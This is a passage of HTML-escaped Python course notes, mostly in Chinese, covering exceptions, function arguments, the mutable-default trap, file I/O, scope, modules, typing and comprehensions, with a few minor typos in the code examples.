&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;LookupError&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ne"&gt;IndexError&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ne"&gt;KeyError&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;finally&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;避免使用 &lt;code&gt;Exception&lt;/code&gt; (所有 exceptions 的父類別, 會抓到所有的例外)  &lt;ul&gt;
&lt;li&gt;除非是在頂層, 如果 except 後面不寫東西, 也是代表抓所有的例外  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;try&lt;/code&gt; 裏面的 code 要儘量減少, 儘量把要執行的 code 放在 else  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;finally&lt;/code&gt; 用來寫意外發生的時候要如何善後的code  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;raise KeyError('xxxxx')&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;def&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;定義一個function  &lt;/li&gt;
&lt;li&gt;如果沒寫回傳值的話，會回傳&lt;code&gt;None&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;unpack 用法&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;y&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;x&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;  

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# *args 代表接受任意長度的參數  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# 回傳一個 tuple  &lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# **kargs 可以接受 keyword argument  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;kargs&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 回傳一個 key 和 value 對應的 dictionary  &lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;  

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;kargs&lt;/span&gt;  

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# Syntax Error, 特定的argument要放在 *args 前面  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;  

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="c1"&gt;# 接收所有的參數  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;kargs&lt;/span&gt; &lt;span class="c1"&gt;# 可以透過這樣的寫法  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 將所有參數原封不動傳給另外一個function  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 最好是 hack 別人的 library 或是  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 要修正自己的 function 時再用  &lt;/span&gt;

&lt;span class="c1"&gt;# def statement in python3  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# python3 比較彈性 這樣寫不會噴 syntax error  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 但 k 只能用 keyword argument 指定  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# 因為所有 position 指定的方式都會被 *args 吃掉  &lt;/span&gt;

&lt;span class="c1"&gt;# python functions are first-class functions  &lt;/span&gt;
&lt;span class="c1"&gt;# you can pass functions as arguments and assign functions to variables  &lt;/span&gt;
&lt;span class="c1"&gt;# like function pointer in c  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;A trap of the default value&lt;/h3&gt;
&lt;p&gt;參見 &lt;code&gt;ex_defval_trap.py&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;這是新手很容易遇到的一個問題之一&lt;br /&gt;
list 是在 function define 的時候就建立了, 不是在 function 被 called 的時候&lt;br /&gt;
所以 &lt;code&gt;list = []&lt;/code&gt; 這個方式並不會在每次呼叫該 function 的時候把 list 清空&lt;br /&gt;
只有在該 fuction 第一次被呼叫時，該 list 會是空的&lt;br /&gt;
所以避免用 Mutable types 來當 default value&lt;br /&gt;
如果要用的話 可以使用類似下面這種方式  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;items&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="c1"&gt;# 這樣就可以每次把list清空  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Swap two variables in Python&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="c1"&gt;# x == 1 , y == 2  &lt;/span&gt;
&lt;span class="c1"&gt;# 可用 y, x = x, y 直接做 swap  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;File object&lt;/h2&gt;
&lt;h3&gt;Read&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;input.txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;seek&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  

&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Write&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;output.txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a line.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 要記得加換行符  &lt;/span&gt;
&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;csv module&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;csv&lt;/span&gt;  

&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ex_csv.csv&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
    &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;csv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
    &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Documentation&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://docs.python.org/2/"&gt;http://docs.python.org/2/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.python.org/3/"&gt;http://docs.python.org/3/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;help($name)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;dir($name)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;'\n'.join(dir($name))&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;pydoc $name&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Your Documentation&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;可以自己寫 pydoc 說明自己寫的東西  &lt;/li&gt;
&lt;li&gt;可以用 python 來寫測試其他語言的工具  &lt;ul&gt;
&lt;li&gt;Data model 有許多 special method (&lt;strong&gt;xxx&lt;/strong&gt;) 的詳細說明  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Scope&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;function scope  &lt;ul&gt;
&lt;li&gt;scopes are decided by functions.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;The LEGB Rule (python 變數查找的規則)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;變數查找順序依序為  &lt;ul&gt;
&lt;li&gt;local  &lt;/li&gt;
&lt;li&gt;enclosed  &lt;/li&gt;
&lt;li&gt;global  &lt;/li&gt;
&lt;li&gt;built-in  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href="http://clime.mosky.tw"&gt;clime&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;自動將 python code 轉為 command line 介面的 script  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;locals()[sys.argv[1]]()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Module and Package&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;module&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# module.py  &lt;/span&gt;

&lt;span class="c1"&gt;# 資料夾底下有 __init__.py 的話 就是 python 的 package  &lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;package&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# __init__.py , package 指的是該資料夾的名字  &lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;package.module&lt;/span&gt; &lt;span class="c1"&gt;# package/module.py  &lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# package/module.py  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;$ python -m package.module&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不要把自訂的 module 的名字取的跟 built-in module 的名字一樣  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Typing&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;python is not static typing, is dynamic typing  &lt;/li&gt;
&lt;li&gt;Dynamic typing  &lt;ul&gt;
&lt;li&gt;check types in run time  &lt;/li&gt;
&lt;li&gt;a variable just points to an object  &lt;/li&gt;
&lt;li&gt;一個變數的 reference counter 歸零後, 就會被 GC 回收  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Duck Typing  &lt;ul&gt;
&lt;li&gt;不在乎你是什麼, 只在乎你會做什麼事  &lt;/li&gt;
&lt;li&gt;A style of dynamic typing  &lt;/li&gt;
&lt;li&gt;如果真的要檢查type的話, 可以用  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;if hasattr(x, '__iter__')&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;用來選擇使用者輸入的type  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;assert hasattr(x, '__iter__'), 'x must be iterable'&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;string 和 integer 都支援 += 這個 operator  &lt;/li&gt;
&lt;li&gt;item vs. items  &lt;/li&gt;
&lt;li&gt;employee vs. employee_name  &lt;/li&gt;
&lt;li&gt;args vs. kargs  &lt;/li&gt;
&lt;li&gt;寫好 Documentation 很重要  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Protocol&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;iterator Protocol  &lt;ul&gt;
&lt;li&gt;object which supports &lt;code&gt;__iter__()&lt;/code&gt; and &lt;code&gt;next()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;readable  &lt;ul&gt;
&lt;li&gt;object which supports &lt;code&gt;read()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Weak typing&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;It converts the type if you do an operation not supported with original type  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;python 不是 weak typing !&lt;br /&gt;
weak typing 和 dynamic typing 是不同的  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Strong typing&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;python 是 strong typing  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;1 + 'a'&lt;/code&gt; 會噴 Exception  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Comprehension&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;list comprehension  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;              &lt;span class="c1"&gt;# for 的前面是個 exp. 後面是疊代的條件  &lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# [1, 3, 5, 7, 9]  &lt;/span&gt;
